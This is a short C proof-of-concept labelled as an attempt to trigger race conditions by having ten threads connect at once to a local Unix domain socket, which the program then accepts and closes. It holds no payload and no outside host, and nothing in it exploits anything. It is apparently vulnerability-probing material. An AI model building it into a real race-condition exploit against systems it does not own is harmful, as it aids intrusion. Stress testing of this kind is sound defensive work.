/*
 * PoC: Multi-threaded connect to trigger race conditions
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>
#include <pthread.h>

#define SOCK_PATH "/tmp/poc_mt.sock"

int server_fd;

void *client_thread(void *arg)
{
    int fd, ret;
    struct sockaddr_un addr;
    
    fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) { perror("thread socket"); return NULL; }
    
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCK_PATH, sizeof(addr.sun_path) - 1);
    
    ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) {
        /* May fail if server already accepted */
        close(fd);
        return NULL;
    }
    
    /* Do something with the socket */
    close(fd);
    return NULL;
}

int main(void)
{
    int ret, i;
    struct sockaddr_un addr;
    pthread_t threads[20];
    
    unlink(SOCK_PATH);
    
    server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); return 1; }
    
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCK_PATH, sizeof(addr.sun_path) - 1);
    
    ret = bind(server_fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) { perror("bind"); return 1; }
    
    ret = listen(server_fd, 20);
    if (ret < 0) { perror("listen"); return 1; }
    
    printf("[+] Server listening\n");
    
    /* Create multiple client threads */
    for (i = 0; i < 10; i++) {
        pthread_create(&threads[i], NULL, client_thread, NULL);
    }
    
    /* Accept connections */
    for (i = 0; i < 10; i++) {
        int fd = accept(server_fd, NULL, NULL);
        if (fd >= 0) { close(fd); }
        else { perror("accept"); break; }
    }
    
    for (i = 0; i < 10; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("[+] Done\n");
    
    close(server_fd);
    unlink(SOCK_PATH);
    
    return 0;
}
